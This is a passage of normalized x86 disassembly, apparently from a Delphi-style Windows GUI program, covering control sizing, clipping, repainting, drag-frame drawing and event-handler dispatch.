mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448af8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448b24
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_463e18
sub_448b54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44a180
sub_448bd0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_42445c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424478
sub_448d9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_448e32
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4216dc
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_448fb4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404570
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e39
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448fe4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_448e40
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_448e88
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
test esi esi
je r-xdata
mov edx ebx
call sub_44c42c
mov edx ebx
mov eax esi
call sub_44c358
mov eax ebx
call sub_4485e0
sub_448ed4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403564
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44a180
mov eax edi
mov si 0xffd0
call sub_403564
sub_448f6c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45cd74
mov edx ebx
mov eax esi
call sub_421254
sub_448f90
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44a180
pop ebx
retn
sub_448fb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_448f28
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404254
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_448f38
sub_448fe4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449039
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404570
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449040
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax esi
call sub_404624
mov edx eax
mov eax ebx
call sub_448f90
sub_449064
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_4243b8
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44a180
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_4243b8
mov [ ebx + 0x84 ] eax
sub_4491ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4491dc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44615c
mov eax esi
call sub_44615c
jmp r-xdata
sub_449224
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4188fc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418790
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41891c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493fc
mov eax ebx
call sub_45fd68
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403564
sub_4492a4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_449224
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_449224
jmp r-xdata
sub_4492c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44935e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449365
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
sub_449370
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4188fc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4188a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_448954
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4493fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448954
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7b4
push eax
call InvalidateRect
push ebp
call sub_449370
pop ecx
test al al
je r-xdata
mov al 0x1
sub_449498
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_45fd40
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44a180
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403564
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4494fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7b4
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4495d5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d5c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
sub_449674
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
call sub_44a1b4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448af8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e5c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44a180
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4472dc
sub_449748
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_449784
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4497d0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4497fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_448f58
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_448f44
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402b1c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402b1c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_44f7b4
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4498e0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44992c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403564
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403564
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4499f0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_449a3c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_449a88
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_4249d8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449baa
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_449bdc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_448af8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403564
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403564
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403564
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403564
jmp r-xdata
sub_449ccc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41723c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44a1b4
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_448f44
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_448f58
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_41728c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449eac
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_448acc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403564
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44f7b4
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4466a0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_449e97
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
